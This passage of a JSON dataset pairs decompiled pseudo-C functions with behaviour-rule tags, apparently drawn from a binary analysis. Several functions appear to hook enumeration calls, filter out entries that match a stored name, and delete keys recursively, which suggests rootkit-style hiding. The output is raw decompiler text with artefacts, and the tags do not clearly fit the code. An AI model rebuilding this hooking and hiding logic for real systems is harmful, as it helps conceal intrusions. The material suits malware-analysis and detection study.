        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0001ba30(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t extraout_ECX;\n    uint32_t extraout_ECX_00;\n    uint *puVar3;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint32_t var_15h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_15h._0_1_ = 0;\n    if (arg_8h == 0) {\n        uVar2 = in_EAX & 0xffffff00;\n    }\n    else {\n        fcn.000569a0(0xb1c5b098);\n        iVar1 = fcn.0001b770(0xb1c5b094, 0, 0);\n        if (iVar1 == 0) {\n            uVar2 = fcn.000674e0(0xb1c5b098);\n            uVar2 = uVar2 & 0xffffff00;\n        }\n        else {\n            var_ch = fcn.0005a110();\n            uVar2 = extraout_ECX;\n            if (arg_ch != '\\0') {\n                fcn.00034550(0xb1c59994);\n                for (var_4h = 0; var_4h < 0x10; var_4h = var_4h + 1) {\n                    if ((*(var_4h * 8 + -0x4e3a6668) == arg_8h) &&\n                       ((*(var_4h * 8 + -0x4e3a6664) == var_ch || (arg_8h < 0)))) {\n                        *(var_4h * 8 + -0x4e3a6668) = 0;\n                        *(var_4h * 8 + -0x4e3a6664) = 0;\n                        break;\n                    }\n                }\n                fcn.000345c0(0xb1c59994);\n                uVar2 = extraout_ECX_00;\n                if (var_4h < 0x10) {\n                    var_15h._0_1_ = 1;\n                }\n            }\n            if ((((arg_8h & 0x80000000) == 0x80000000) && (arg_8h != 0xfffffffe)) && (arg_8h != 0xffffffff)) {\n                var_20h = 0;\n            }\n            else {\n                var_20h = 1;\n            }\n            iVar1 = (**0xb1bde2a4)(arg_8h, 0, 0, uVar2 & 0xffffff00 | var_20h, &var_10h, 0);\n            if (iVar1 == 0) {\n                *0x8 = (var_10h >> 8 ^ var_10h ^ var_10h >> 0x10 ^ var_10h >> 0x18) % 100;\n                (**0xb1bde2e4)();\n            }\n            else {\n                stack0xffffffe8 = 0;\n                var_10h = 0;\n            }\n            if (var_10h == 0) {\n                uVar2 = fcn.000674e0(0xb1c5b098);\n                uVar2 = uVar2 & 0xffffff00 | var_15h;\n            }\n            else {\n                fcn.00034550(0xb1c59ac4);\n                if (((arg_ch == '\\0') || (*(var_10h - 0x14) == 1)) &&\n                   (var_8h = *(*0xb1c59abc + stack0xffffffe8 * 4),  var_8h != 0)) {\n                    for (var_4h = 0; var_4h < 100; var_4h = var_4h + 1) {\n                        if (*(var_8h + 4 + var_4h * 0x20) == var_10h) {\n                            fcn.00035330(*(var_8h + 0x14 + var_4h * 0x20));\n                            puVar3 = var_4h * 0x20 + var_8h;\n                            *puVar3 = 0;\n                            puVar3[1] = 0;\n                            puVar3[2] = 0;\n                            puVar3[3] = 0;\n                            puVar3[4] = 0;\n                            puVar3[5] = 0;\n                            puVar3[6] = 0;\n                            puVar3[7] = 0;\n                            break;\n                        }\n                    }\n                }\n                fcn.000345c0(0xb1c59ac4);\n                uVar2 = fcn.000674e0(0xb1c5b098);\n                uVar2 = uVar2 & 0xffffff00 | var_15h;\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 1163
    },
    "0001bc60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ch\n\nint32_t __cdecl fcn.0001bc60(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_14h = 0;\n    var_28h = 0;\n    var_18h = 0;\n    uVar5 = arg_ch;\n    iVar3 = arg_10h;\n    iVar4 = arg_14h;\n    pcVar2 = fcn.000639f0(arg_8h);\n    iVar3 = (*pcVar2)(arg_8h, uVar5, iVar3, iVar4, arg_18h, arg_1ch);\n    if ((((arg_10h == 2) || (arg_10h == 4)) && (cVar1 = fcn.0001f620(),  cVar1 == '\\0')) &&\n       ((iVar3 == 0 || (iVar3 == -0x7ffffffb)))) {\n        if (arg_10h == 2) {\n            var_14h = arg_14h;\n            var_8h = *(arg_14h + 0x14);\n        }\n        else {\n            var_28h = arg_14h;\n            var_8h = *(arg_14h + 0xc);\n        }\n        var_24h = fcn.000352f0(4, var_8h);\n        if (var_24h == 0) {\n            var_1ch = -0x3fffff66;\n        }\n        else {\n            var_18h = fcn.00035200(0x402);\n            if (var_18h == 0) {\n                var_1ch = -0x3fffff66;\n            }\n            else {\n                var_1ch = fcn.00034aa0(arg_ch, &var_4h);\n                if (var_1ch == 0) {\n                    var_ch = 0;\n                    var_10h = 0;\n                    while (((var_ch < var_8h &&\n                            (iVar4 = fcn.00078610(arg_8h, var_ch, 0, var_18h, 0x400, 0xb1c59ac0, var_4h), \n                            iVar4 != -0x7fffffe6)) && ((iVar4 == 0 || (iVar4 == -0x7ffffffb))))) {\n                        if (iVar4 == 0) {\n                            *(var_18h + 0x10 + (*(var_18h + 0xc) & 0xfffffffe)) = 0;\n                        }\n                        else {\n                            *(var_18h + 0x400) = 0;\n                        }\n                        cVar1 = fcn.0001cae0(var_18h + 0x10);\n                        if (cVar1 == '\\0') {\n                            *(var_24h + var_10h * 4) = var_ch;\n                            var_10h = var_10h + 1;\n                        }\n                        var_ch = var_ch + 1;\n                    }\n                    fcn.00034af0(arg_ch, var_4h);\n                    if (var_8h == var_10h) {\n                        fcn.00035330(var_24h);\n                        var_24h = 0;\n                    }\n                    cVar1 = fcn.0001c5d0(arg_ch, var_24h, var_10h, var_8h);\n                    if (cVar1 != '\\0') {\n                        var_24h = 0;\n                    }\n                    if (arg_10h == 2) {\n                        *(var_14h + 0x14) = var_10h;\n                    }\n                    else {\n                        *(var_28h + 0xc) = var_10h;\n                    }\n                    var_1ch = 0;\n                }\n            }\n        }\n        fcn.00035330(var_18h);\n        fcn.00035330(var_24h);\n        if (var_1ch != 0) {\n            iVar3 = var_1ch;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 1052
    },
    "0001bec0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0001bec0(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, int32_t arg_20h)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    cVar1 = fcn.0001f620();\n    if ((cVar1 != '\\0') || (arg_20h == -0x4e3a6540)) {\n        pcVar2 = fcn.000639f0(arg_8h);\n        iVar3 = (*pcVar2)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n        return iVar3;\n    }\n    *0xb1c5b07c = *0xb1c5b07c + 1;\n    cVar1 = fcn.0001c860(arg_ch, arg_10h, &var_ch);\n    if (cVar1 != '\\0') {\n        *0xb1c5b080 = *0xb1c5b080 + 1;\n        pcVar2 = fcn.000639f0(arg_8h);\n        iVar3 = (*pcVar2)(arg_8h, arg_ch, var_ch, arg_14h, arg_18h, arg_1ch, arg_20h);\n        return iVar3;\n    }\n    iVar3 = fcn.00035200(0x402);\n    if (iVar3 == 0) {\n        return -0x3fffff66;\n    }\n    var_14h = fcn.00034aa0(arg_ch, &var_4h);\n    if (var_14h == 0) {\n        var_8h = 0;\n        var_ch = 0;\n        do {\n            var_14h = fcn.00078610();\n            if ((var_14h != 0) && (var_14h != -0x7ffffffb)) goto code_r0x0001c044;\n            if (var_14h == 0) {\n                *(iVar3 + 0x10 + (*(iVar3 + 0xc) & 0xfffffffe)) = 0;\n            }\n            else {\n                *(iVar3 + 0x400) = 0;\n            }\n            cVar1 = fcn.0001cae0(iVar3 + 0x10);\n            if (cVar1 == '\\0') {\n                if (var_ch == arg_10h) goto code_r0x0001c02d;\n                var_ch = var_ch + 1;\n            }\n            var_8h = var_8h + 1;\n        } while( true );\n    }\ncode_r0x0001c051:\n    fcn.00035330(iVar3);\n    if (var_14h == 0) {\n        iVar3 = var_8h;\n        pcVar2 = fcn.000639f0(arg_8h);\n        var_14h = (*pcVar2)(arg_8h, arg_ch, iVar3, arg_14h, arg_18h, arg_1ch, arg_20h);\n    }\n    return var_14h;\ncode_r0x0001c02d:\n    var_14h = 0;\ncode_r0x0001c044:\n    fcn.00034af0(arg_ch, var_4h);\n    goto code_r0x0001c051;\n}\n",
        "token_count": 831
    },
    "0001c0a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0001c0a0(uint param_1, uint param_2, uint param_3, int32_t param_4, uint param_5, uint param_6, uint param_7\n                    , int32_t *param_8)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_ch;\n    uint var_10h;\n    int32_t var_18h;\n    uint var_18h_2;\n    uint var_1ch;\n    uint var_20h;\n    int32_t *var_24h;\n    int32_t *piVar4;\n    uint var_20h_2;\n    int32_t var_1ch_2;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0xb1c458b0;\n    uStack16 = 0xb1c4578a;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    iVar3 = var_18h;\n    piVar4 = var_24h;\n    pcVar2 = fcn.000639f0(var_8h);\n    iVar3 = (*pcVar2)(var_8h, var_ch, var_10h, iVar3, var_18h_2, var_1ch, var_20h, piVar4);\n    if (iVar3 == 0) {\n        if (var_24h == NULL) {\n            var_1ch_2 = 1;\n        }\n        else {\n            cVar1 = (**0xb1bde0c4)();\n            if (cVar1 == '\\0') {\n                var_1ch_2 = *var_24h;\n            }\n            else {\n                var_4h = 0;\n                (**0xb1bde2e0)(var_24h, 4, 1);\n                var_1ch_2 = *var_24h;\n                var_4h = 0xffffffff;\n            }\n        }\n        if (var_1ch_2 == 1) {\n            fcn.0001ba30(*(var_18h + 4), 0);\n        }\n    }\n    *in_FS_OFFSET = var_10h_2;\n    return iVar3;\n}\n",
        "token_count": 552
    },
    "0001c190": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0001c190(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint *puVar1;\n    char cVar2;\n    code *pcVar3;\n    uint uVar4;\n    uint *var_4d8h;\n    uint var_4d4h;\n    uint var_4d0h;\n    ushort auStack1228 [2];\n    uint var_4c4h;\n    int32_t var_2c4h;\n    uint var_2c0h;\n    uint var_2b8h;\n    uint var_2b4h;\n    uint var_2b0h;\n    int32_t var_2ach;\n    uint var_2a8h;\n    uint var_2a0h;\n    uint var_29ch;\n    uint *var_298h;\n    uint var_294h;\n    uint var_290h;\n    uint var_28ch;\n    uint var_288h;\n    uint var_82h;\n    int32_t var_7ch;\n    uint var_78h;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    uVar4 = arg_10h;\n    pcVar3 = fcn.000639f0(arg_8h);\n    var_2c4h = (*pcVar3)(arg_8h, arg_ch, uVar4);\n    if ((var_2c4h == 0) && (cVar2 = (**0xb1bde0c4)(),  cVar2 != '\\x01')) {\n        var_2c4h = (**0xb1bde2a4)(arg_10h, 0x80000000, **0xb1bde104, 0, &var_2ach, 0);\n        if (var_2c4h == 0) {\n            var_1h._0_1_ = '\\0';\n            var_2b4h._0_2_ = 0x43;\n            while ((var_2b4h < 0x5b && (var_1h == '\\0'))) {\n                fcn.000785aa(&var_4d0h, 0xb1bde700, var_2b4h);\n                fcn.00078550(&var_2a8h, &var_4d0h);\n                var_2c4h = (**0xb1bde2f0)(&var_2a8h, 0, &var_8h, &var_2b8h);\n                if (var_2c4h == 0) {\n                    if (*(var_2ach + 4) == *(var_8h + 4)) {\n                        var_1h._0_1_ = '\\x01';\n                    }\n                    (**0xb1bde2e4)();\n                }\n                var_2b4h._0_2_ = var_2b4h + 1;\n            }\n            if ((var_1h != '\\0') && (*(var_2ach + 0x30) < 499)) {\n                fcn.0007877e(&var_4c4h, *(var_2ach + 0x34), *(var_2ach + 0x30));\n                *(&var_4d0h + (*(var_2ach + 0x30) + 0xc & 0xfffffffe)) = 0;\n                fcn.00078544(arg_10h);\n                var_2b0h = fcn.0005a110();\n                fcn.00034550(0xb1c59994);\n                for (var_7ch = 0; var_7ch < 0x10; var_7ch = var_7ch + 1) {\n                    if (*(var_7ch * 8 + -0x4e3a6668) == 0) {\n                        *(var_7ch * 8 + -0x4e3a6668) = arg_10h;\n                        *(var_7ch * 8 + -0x4e3a6664) = var_2b0h;\n                        break;\n                    }\n                }\n                if (0xf < var_7ch) {\n                    fcn.00078586(0xb1c59998, 0xb1c599a0, 0x78);\n                    *0xb1c59a10 = arg_10h;\n                    *0xb1c59a14 = var_2b0h;\n                }\n                fcn.000345c0(0xb1c59994);\n                fcn.0002be50(&var_78h, 0x52);\n                fcn.00078556(&var_288h, 0x104, 0xb1bde710, &var_78h);\n                var_82h._0_2_ = 0;\n                fcn.00078550(&var_2a8h, &var_288h);\n                var_20h = 0x18;\n                var_1ch = 0;\n                var_14h = 0x140;\n                var_18h = &var_2a8h;\n                var_10h = 0;\n                var_ch = 0;\n                fcn.00078550(&var_2c0h, &var_4d0h);\n                var_2a0h = 0x18;\n                var_29ch = 0;\n                var_294h = 0x40;\n                var_298h = &var_2c0h;\n                var_290h = 0;\n                var_28ch = 0;\n                var_2c4h = fcn.0007860a(&var_20h, &var_2a0h);\n                if (var_2c4h == 0) {\n                    var_2c4h = fcn.0007854a(&var_4d4h, 0xf003f, &var_20h);\n                    if (var_2c4h == 0) {\n                        fcn.0001cbd0(var_4d4h, &var_288h, 0, 4);\n                        fcn.00078544(var_4d4h);\n                    }\n                    fcn.00078604(&var_20h);\n                    puVar1 = &var_4d4h + 2;\n                    do {\n                        var_4d8h = puVar1;\n                        puVar1 = var_4d8h + 2;\n                    } while (*(var_4d8h + 2) != 0);\n                    *(var_4d8h + 2) = *0xb1bde748;\n                    *(var_4d8h + 6) = *0xb1bde74c;\n                    *(var_4d8h + 10) = *0xb1bde750;\n                    fcn.00078550(&var_2c0h, &var_4d0h);\n                    var_2a0h = 0x18;\n                    var_29ch = 0;\n                    var_294h = 0x40;\n                    var_298h = &var_2c0h;\n                    var_290h = 0;\n                    var_28ch = 0;\n                    fcn.00078568(&var_2a0h);\n                }\n            }\n            (**0xb1bde2e4)();\n            var_2c4h = 0;\n        }\n        else {\n            var_2c4h = 0;\n        }\n    }\n    return var_2c4h;\n}\n",
        "token_count": 1754
    },
    "0001c5d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0001c5d0(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint var_38h;\n    uint var_34h;\n    uint32_t var_30h;\n    int32_t var_2ch;\n    uint32_t var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    int32_t var_4h;\n    \n    fcn.000569a0(0xb1c5b098);\n    iVar2 = fcn.0001b770(0xb1c5b094, 0, 0);\n    if (iVar2 == 0) {\n        fcn.000674e0(0xb1c5b098);\n        uVar4 = 0;\n    }\n    else {\n        uVar3 = (**0xb1bde100)(&var_18h);\n        if ((((arg_8h & 0x80000000) == 0x80000000) && (arg_8h != 0xfffffffe)) && (arg_8h != 0xffffffff)) {\n            var_30h = 0;\n        }\n        else {\n            var_30h = 1;\n        }\n        iVar2 = (**0xb1bde2a4)(arg_8h, 0, 0, uVar3 & 0xffffff00 | var_30h, &var_24h, 0);\n        if (iVar2 == 0) {\n            var_28h = (var_24h >> 8 ^ var_24h ^ var_24h >> 0x10 ^ var_24h >> 0x18) % 100;\n            (**0xb1bde2e4)();\n        }\n        else {\n            var_28h = 0;\n            var_24h = 0;\n        }\n        if (var_24h == 0) {\n            fcn.000674e0(0xb1c5b098);\n            uVar4 = 0;\n        }\n        else {\n            fcn.00034550(0xb1c59ac4);\n            if (*(*0xb1c59abc + var_28h * 4) == 0) {\n                uVar4 = fcn.000352f0(100, 0x20);\n                *(*0xb1c59abc + var_28h * 4) = uVar4;\n                if (*(*0xb1c59abc + var_28h * 4) == 0) {\n                    fcn.000345c0(0xb1c59ac4);\n                    fcn.000674e0(0xb1c5b098);\n                    return 0;\n                }\n            }\n            var_20h = *(*0xb1c59abc + var_28h * 4);\n            var_2ch = 0;\n            var_10h = 0;\n            var_ch = 0;\n            var_4h = -1;\n            for (var_1ch = 0; var_1ch < 100; var_1ch = var_1ch + 1) {\n                if (*(var_20h + 4 + var_1ch * 0x20) == 0) {\n                    var_4h = var_1ch;\n                    break;\n                }\n                puVar1 = var_20h + 8 + var_1ch * 0x20;\n                iVar2 = (var_14h - *(var_20h + 0xc + var_1ch * 0x20)) - (var_18h < *puVar1);\n                if ((var_ch <= iVar2) && ((var_ch < iVar2 || (var_10h < var_18h - *puVar1)))) {\n                    var_2ch = var_1ch;\n                    puVar1 = var_20h + 8 + var_1ch * 0x20;\n                    var_10h = var_18h - *puVar1;\n                    var_ch = (var_14h - *(var_20h + 0xc + var_1ch * 0x20)) - (var_18h < *puVar1);\n                }\n            }\n            if (var_4h != -1) {\n                var_2ch = var_4h;\n            }\n            fcn.00035330(*(var_20h + 0x14 + var_2ch * 0x20));\n            *(var_20h + 4 + var_2ch * 0x20) = var_24h;\n            *(var_20h + 0x14 + var_2ch * 0x20) = arg_ch;\n            *(var_20h + 0x10 + var_2ch * 0x20) = arg_10h;\n            *(var_20h + 0x18 + var_2ch * 0x20) = arg_14h;\n            *(var_20h + 8 + var_2ch * 0x20) = var_18h;\n            *(var_20h + 0xc + var_2ch * 0x20) = var_14h;\n            fcn.000345c0(0xb1c59ac4);\n            fcn.000674e0(0xb1c5b098);\n            uVar4 = 1;\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 1276
    },
    "0001c860": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Removing unreachable block (ram,0x0001ca66)\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0001c860(uint32_t arg_8h, uint32_t arg_ch, uint32_t *arg_10h)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t extraout_ECX;\n    bool bVar6;\n    uint var_38h;\n    uint var_34h;\n    uint32_t var_30h;\n    uint32_t var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint var_5h;\n    \n    var_5h._0_1_ = 0;\n    fcn.000569a0(0xb1c5b098);\n    iVar4 = fcn.0001b770(0xb1c5b094, 0, 0);\n    if (iVar4 == 0) {\n        uVar5 = fcn.000674e0(0xb1c5b098);\n        uVar5 = uVar5 & 0xffffff00;\n    }\n    else {\n        (**0xb1bde100)(&var_10h);\n        var_2ch = 0;\n        uVar5 = extraout_ECX;\n        while( true ) {\n            if ((((arg_8h & 0x80000000) == 0x80000000) && (arg_8h != 0xfffffffe)) && (arg_8h != 0xffffffff)) {\n                var_30h = 0;\n            }\n            else {\n                var_30h = 1;\n            }\n            iVar4 = (**0xb1bde2a4)(arg_8h, 0, 0, uVar5 & 0xffffff00 | var_30h, &var_24h, 0);\n            if (iVar4 == 0) {\n                (**0xb1bde2e4)(var_2ch, (var_24h >> 8 ^ var_24h ^ var_24h >> 0x10 ^ var_24h >> 0x18) % 100);\n            }\n            else {\n                var_24h = 0;\n            }\n            if (var_24h == 0) break;\n            fcn.00034550(0xb1c59ac4);\n            var_20h = *(*0xb1c59abc + -0x38e994f0);\n            if (var_20h != 0) {\n                for (var_14h = 0; var_14h < 100; var_14h = var_14h + 1) {\n                    if (*(var_20h + 4 + var_14h * 0x20) == var_24h) {\n                        puVar1 = var_20h + 8 + var_14h * 0x20;\n                        piVar2 = var_20h + 0xc + var_14h * 0x20;\n                        uVar5 = var_10h < *puVar1;\n                        uVar3 = var_ch - *piVar2;\n                        bVar6 = uVar3 - uVar5 < 0;\n                        if ((bVar6) ||\n                           ((uVar3 == uVar5 || (SBORROW4(var_ch, *piVar2) != SBORROW4(uVar3, uVar5)) != bVar6 &&\n                            (var_10h - *puVar1 < 100000000)))) {\n                            if (arg_10h != NULL) {\n                                if (*(var_20h + 0x14 + var_14h * 0x20) == 0) {\n                                    *arg_10h = arg_ch;\n                                }\n                                else if (arg_ch < *(var_20h + 0x10 + var_14h * 0x20)) {\n                                    *arg_10h = *(*(var_20h + 0x14 + var_14h * 0x20) + arg_ch * 4);\n                                }\n                                else {\n                                    *arg_10h = *(var_20h + 0x18 + var_14h * 0x20);\n                                }\n                            }\n                            var_5h._0_1_ = 1;\n                        }\n                        else {\n                            fcn.000345c0(0xb1c59ac4);\n                            fcn.0001ba30(arg_8h, 0);\n                            fcn.00034550(0xb1c59ac4);\n                        }\n                        break;\n                    }\n                }\n            }\n            fcn.000345c0(0xb1c59ac4);\n            if ((var_5h != 0) || (var_1ch = fcn.00035200(0x402),  var_1ch == 0)) break;\n            iVar4 = fcn.00034aa0(arg_8h, &var_5h + 1);\n            if (iVar4 == 0) {\n                fcn.00078616(stack0xfffffff8, 2, var_1ch, 0x400, &var_18h);\n                fcn.00034af0(arg_8h, stack0xfffffff8);\n            }\n            fcn.00035330(var_1ch);\n            uVar5 = 0xb1c59ac5;\n            var_2ch = uVar5;\n        }\n        uVar5 = fcn.000674e0(0xb1c5b098);\n        uVar5 = uVar5 & 0xffffff00 | var_5h;\n    }\n    return uVar5;\n}\n",
        "token_count": 1399
    },
    "0001cae0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0001cae0(uint arg_8h)\n\n{\n    int16_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_20h;\n    uint var_18h;\n    int16_t *var_14h;\n    uint var_10h;\n    uint var_8h;\n    int16_t *var_4h;\n    \n    if (*0xb1c5b09c == 0) {\n        fcn.0002beb0(0xb1c59ac8, 0x52);\n        var_4h = 0xb1c59ac8;\n        piVar1 = var_4h;\n        do {\n            var_4h = piVar1;\n            piVar1 = var_4h + 1;\n        } while (*var_4h != 0);\n        *0xb1c5b09c = var_4h + 0x271d329c >> 1;\n        fcn.00078556(0xb1c59a18, 0x52, 0xb1bde754, 0xb1c59ac8);\n        var_14h = 0xb1c59a18;\n        piVar1 = var_14h;\n        do {\n            var_14h = piVar1;\n            piVar1 = var_14h + 1;\n        } while (*var_14h != 0);\n        *0xb1c59b6c = var_14h + 0x271d32f4 >> 1;\n    }\n    iVar2 = fcn.000785bc(arg_8h, 0xb1c59ac8, *0xb1c5b09c);\n    if (iVar2 == 0) {\n        uVar3 = 1;\n    }\n    else {\n        iVar2 = fcn.00036010(arg_8h, 0xb1c59a18, *0xb1c59b6c);\n        if (iVar2 == 0) {\n            uVar3 = 1;\n        }\n        else {\n            uVar3 = 0;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 481
    },
    "0001cbd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0001cbd0(uint arg_8h, int16_t *arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    code *pcVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    int32_t iVar9;\n    uint uVar10;\n    uint *puVar11;\n    uint var_5ch;\n    uint var_54h;\n    int16_t *var_50h;\n    uint var_4ch;\n    uint var_44h;\n    int16_t *var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_2dh;\n    uint var_28h;\n    uint var_24h;\n    uint *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_2dh._0_1_ = 0;\n    fcn.000569a0(0xb1c5b098);\n    iVar3 = fcn.0001b770(0xb1c5b094, 0, 0);\n    if (iVar3 == 0) {\n        uVar4 = fcn.000674e0(0xb1c5b098);\n        uVar4 = uVar4 & 0xffffff00;\n    }\n    else if (arg_10h < arg_14h) {\n        var_10h = fcn.00035200(0x402);\n        if (var_10h != 0) {\n            var_8h = 0;\n            while( true ) {\n                puVar11 = &var_4h;\n                uVar10 = 0x400;\n                uVar8 = 0;\n                uVar6 = *0xb1c5b088;\n                uVar7 = arg_8h;\n                iVar3 = var_8h;\n                iVar9 = var_10h;\n                pcVar5 = fcn.000639f0(*0xb1c5b088);\n                *NULL = (*pcVar5)(uVar6, uVar7, iVar3, uVar8, iVar9, uVar10, puVar11);\n                if (*NULL == -0x7fffffe6) break;\n                if ((*NULL != 0) && (*NULL != -0x7ffffffb)) goto code_r0x0001ce06;\n                if (*NULL == 0) {\n                    *(var_10h + 0x10 + (*(var_10h + 0xc) & 0xfffffffe)) = 0;\n                }\n                else {\n                    *(var_10h + 0x400) = 0;\n                }\n                if (arg_10h + 1 <= arg_14h) {\n                    var_40h = arg_ch;\n                    do {\n                        iVar1 = *var_40h;\n                        var_40h = var_40h + 1;\n                    } while (iVar1 != 0);\n                    var_50h = var_10h + 0x10;\n                    do {\n                        iVar1 = *var_50h;\n                        var_50h = var_50h + 1;\n                    } while (iVar1 != 0);\n                    var_ch = fcn.00035200(((var_40h - (arg_ch + 1) >> 1) + 1 + (var_50h - (var_10h + 0x12) >> 1)) * 2 +\n                                          2);\n                    if (var_ch != 0) {\n                        fcn.000785aa(var_ch, 0xb1bde768, arg_ch, var_10h + 0x10);\n                        fcn.00078550(&var_38h, var_ch);\n                        var_28h = 0x18;\n                        var_24h = 0;\n                        var_1ch = 0x140;\n                        var_20h = &var_38h;\n                        var_18h = 0;\n                        var_14h = 0;\n                        *NULL = fcn.0007854a(&var_3ch, 0xf003f, &var_28h);\n                        if (*NULL == 0) {\n                            cVar2 = fcn.0001cbd0(var_3ch, var_ch, arg_10h + 1, arg_14h);\n                            if (cVar2 != '\\0') {\n                                var_8h = var_8h + -1;\n                            }\n                            fcn.00078544(var_3ch);\n                        }\n                        fcn.00035330(var_ch);\n                    }\n                }\n                var_8h = var_8h + 1;\n            }\n            stack0xffffffd0 = 0;\ncode_r0x0001ce06:\n            fcn.00035330(var_10h);\n        }\n        *NULL = fcn.0007857a(arg_8h);\n        if (*NULL == 0) {\n            var_2dh._0_1_ = 1;\n        }\n        uVar4 = fcn.000674e0(0xb1c5b098);\n        uVar4 = uVar4 & 0xffffff00 | var_2dh;\n    }\n    else {\n        uVar4 = fcn.000674e0(0xb1c5b098);\n        uVar4 = uVar4 & 